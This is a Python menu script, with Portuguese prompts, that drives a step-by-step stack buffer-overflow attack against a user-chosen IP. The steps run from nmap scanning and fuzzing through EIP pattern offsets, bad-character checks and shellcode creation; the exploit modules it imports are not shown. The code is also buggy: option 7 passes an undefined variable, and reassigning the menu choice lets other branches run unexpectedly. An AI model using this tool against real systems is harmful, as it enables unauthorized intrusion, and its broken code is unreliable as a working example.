#!/usr/bin/python3
#-*-coding: utf-8-*-
import sys
import subprocess
from crash import crash
from eip import iep
from exploit import exploit
from fuzzing import fuzzing
from hexa import hex
from pattern_offset import pattern_offser
from shell import shell
from subeip import subeip
print('''\033[36m


██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ 
██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝██║   ██║█████╗  █████╗  █████╗  ██████╔╝
██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║     ██║     ███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
 ______________________________  
/                            / \     \ \ / /
|          OVERFLOW          | ==========  -  - -
\____________________________\_/     / / \ \  

\033[1m''')

print("[1] INSTALAR NMAP")
print("[2] SCANEAR IP DO ALVO")
print("[3] FAZER FUZZING NO ALVO")
print("[4] VALIDAR CRASH")
print("[5] GERAR PADRAO EIP")
print("[6] ENVIAR PADRAO EIP PRO ALVO PARA ENCONTRAR O ENDEREÇO EIP")
print("[7] VERIFICAR COM QUANTOS BYTES O EIP É ATINGIDO")
print("[8] TESTAR CONTROLE SOBRE O EIP")
print("[9] VERIFICAR ESPAÇO PARA SHELLCODE")
print("[10] VERIFICAR CARACTERES HEXADECIMAL INVÁLIDOS")
print("[11] TESTAR EXECUÇÃO DE ENDEREÇO DE RETORNO")
print("[12] CRIAR SHELLCODE ")

opcao = int(input("➤➤ ESCOLHA UMA OPÇÃO: "))
if opcao == 1:
	opcao = subprocess.call(["apt-get","install","nmap"])
	print(opcao)
	print("Execução finalizada")


if opcao == 2:
	ip = input("➤➤ Digite o IP do alvo: ")
	opcao = subprocess.call(["nmap","-v","-sV","-Pn",ip])
	print(opcao)


if opcao == 3:
	ip = input("coloque o ip>")
	porta = input("coloque a porta=>")
	fuzzing(ip,porta)
if opcao == 4:
	ip = input("coloque o ip>")
	porta = input("coloque a porta=>")
	buffer =input("buffer=>")
	crash(ip,porta,buffer)

if opcao == 5:
	buffer = input("➤➤ Digite a quantidade de bytes do fuzzing : ")
	opcao = subprocess.call(["python","pattern.py","create",buffer])
	print(opcao)
	print("➤➤ Copie toda a string padrão que foi gerada, da ultima letra até a primeira.")



if opcao == 6:
	ip = input("coloque o ip>")
	porta = input("coloque a porta=>")
	buffer =input("buffer=>")
	iep(ip,porta,buffer)


if opcao == 7:
	carh = input("pattern_offset=>")
	pattern_offser(ni)

if opcao == 8:
	ip = input("coloque o ip>")
	porta = input("coloque a porta=>")
	buffer =input("buffer=>")
	sob = input("sobeip=>")
	subeip(ip,porta,buffer,sob)



if opcao == 9:
    opcao = subprocess.call(["python","es.py"])
    print(opcao)

 
if opcao == 10:
    opcao = subprocess.call(["python","hexa.py"])
    print(opcao) 


if opcao == 11:
    opcao = subprocess.call(["python","testar.py"])
    print(opcao)


if opcao == 12:
    opcao = subprocess.call(["python","shell.py"])
    print(opcao)

